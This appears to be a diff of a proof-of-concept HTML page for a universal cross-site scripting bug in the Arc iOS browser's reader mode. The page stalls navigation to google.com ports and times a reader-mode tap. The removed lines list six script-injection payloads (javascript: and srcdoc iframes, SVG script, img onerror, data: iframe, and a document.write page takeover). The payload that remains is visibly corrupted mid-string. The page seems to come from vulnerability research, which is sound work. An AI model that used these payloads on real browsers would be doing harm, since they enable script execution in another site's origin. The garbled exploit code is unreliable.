@@ -3,51 +3,49 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Arc iOS reader bypass (benign)</title>
+  <title>Reader PoC</title>
   <style>
     :root { color-scheme: light dark; }
-    body { margin: 0; font-family: system-ui, sans-serif; }
+    body {
+      margin: 0;
+      font-family: system-ui, sans-serif;
+    }
     #source { max-width: 760px; margin: 24px auto; line-height: 1.45; }
-    #cover { position: fixed; inset: 0; z-index: 10; display: grid; place-items: center; background: Canvas; }
-    #cue { padding: 18px 28px; border: 0; border-radius: 14px; background: #555; color: #fff; font: 700 20px system-ui, sans-serif; }
+    #cover {
+      position: fixed;
+      inset: 0;
+      z-index: 10;
+      display: grid;
+      place-items: center;
+      background: Canvas;
+    }
+    #cue {
+      padding: 18px 28px;
+      border: 0;
+      border-radius: 14px;
+      background: #555;
+      color: #fff;
+      font: 700 20px system-ui, sans-serif;
+      opacity: 1;
+    }
     #cue.go { background: #c00020; }
-    iframe, svg, img { width: 1px; height: 1px; border: 0; }
+    iframe { width: 1px; height: 1px; border: 0; }
   </style>
 </head>
 <body>
   <article id="source">
-    <h1>Arc iOS reader sink/stall bypass test</h1>
-    <p>Each element is <code>mercury-parser-keep</code> with a benign origin-gated payload. Whichever
-    survives reader extraction AND executes in a google.com-origin reader view fires a tagged alert.
-    Proof = document.domain only. Stall method chosen via ?method= (default p8443).</p>
-
-    <!-- 1. javascript: iframe (original sink, now fixed = control) -->
-    <iframe class="mercury-parser-keep"
-      src="javascript:(()=>{try{if(/google\.com/.test(parent.location.origin)){alert('SINK jsiframe - '+parent.document.domain)}}catch(e){}})()"></iframe>
-
-    <!-- 2. srcdoc iframe with inline script -->
-    <iframe class="mercury-parser-keep"
-      srcdoc="<script>try{if(/google\.com/.test(parent.location.origin))alert('SINK srcdoc - '+parent.document.domain)}catch(e){}</script>"></iframe>
-
-    <!-- 3. inline SVG script (runs in the reader document directly) -->
-    <svg class="mercury-parser-keep" xmlns="http://www.w3.org/2000/svg"><script>try{if(/google\.com/.test(location.origin))alert('SINK svg - '+document.domain)}catch(e){}</script></svg>
-
-    <!-- 4. img onerror (runs in the reader document directly) -->
-    <img class="mercury-parser-keep" src="x"
-      onerror="try{if(/google\.com/.test(location.origin))alert('SINK img - '+document.domain)}catch(e){}">
-
-    <!-- 5. data: iframe (own opaque origin; completeness) -->
-    <iframe class="mercury-parser-keep"
-      src="data:text/html,<script>try{if(/google\.com/.test(parent.location.origin))alert('SINK data - '+parent.document.domain)}catch(e){}</script>"></iframe>
-
-    <!-- 6. full-takeover via parent document.write (benign: neutral marker, NO cookie dump, NO external img) -->
-    <iframe class="mercury-parser-keep"
-      src="javascript:(()=>{try{if(/google\.com/.test(parent.location.origin)){let s=parent.document.createElement('script');s.textContent=&quot;document.open();document.write('<!doctype html><title>UXSS '+document.domain+'</title><h1>BENIGN UXSS TEST</h1><p id=uxss-proof>domain='+document.domain+' top='+(window===top)+'</p>');document.close();alert('BENIGN UXSS - '+document.domain)&quot;;parent.document.head.appendChild(s)}}catch(e){}})()"></iframe>
-
+    <iframe
+      class="mercury-parser-keep"
+      src="javascript:(()=>{if(parent.location.origin==='https://www.google.com:8443'eateElement('script');s.textContent=&quot;document.open();document.write('<!doctype ht
+ml><title>UXSS '+document.domain+'</title><h1>BENIGN UXSS TEST</h1><br><p id=uxss-proof>domain='+document.domain+' top='+(window===top)+'</p>');document.close();alert(document.domain)&quot;;parent.
+document.head.appendChild(s)}})()">
+    </iframe>
     <p id="padding"></p>
   </article>
 
-  <div id="cover"><button id="cue" type="button" disabled>WAIT</button></div>
+  <div id="cover">
+    <button id="cue" type="button" disabled>WAIT</button>
+  </div>
 
   <script>
   (() => {
@@ -56,17 +54,7 @@
       const value = Number(params.get(name));
       return Number.isFinite(value) ? Math.min(max, Math.max(min, value)) : fallback;
     };
-    // iOS stall methods (recreate the origin-confusion a different way than the fixed :88)
-    const STALLS = {
-      p88:   'https://www.google.com:88/',      // original (fixed) = control
-      p0:    'https://www.google.com:0/',
-      p8443: 'https://www.google.com:8443/',
-      p81:   'https://www.google.com:81/',
-      g204:  'https://www.google.com/generate_204',
-      slow:  'https://www.google.com/searchdomaincheck?format=domain&type=chrome'
-    };
-    const method = params.get('method') || 'p8443';
-    const target = STALLS[method] || STALLS.p8443;
+
     const delay = number('delay', 15000, 5000, 60000);
     const lead = number('lead', 500, 100, 1200);
     const cue = document.querySelector('#cue');
@@ -74,8 +62,14 @@
     document.querySelector('#padding').textContent =
       'Reader extraction padding keeps article conversion busy. '.repeat(19000);
 
-    setTimeout(() => { cue.textContent = 'TAP READER MODE NOW (' + method + ')'; cue.classList.add('go'); }, delay - lead);
-    setTimeout(() => { try { location.assign(target); } catch (e) {} }, delay);
+    setTimeout(() => {
+      cue.textContent = 'TAP READER MODE NOW';
+      cue.classList.add('go');
+    }, delay - lead);
+
+    setTimeout(() => {
+      window.location.assign('https://www.google.com:8443');
+    }, delay);
   })();
   </script>
 </body>
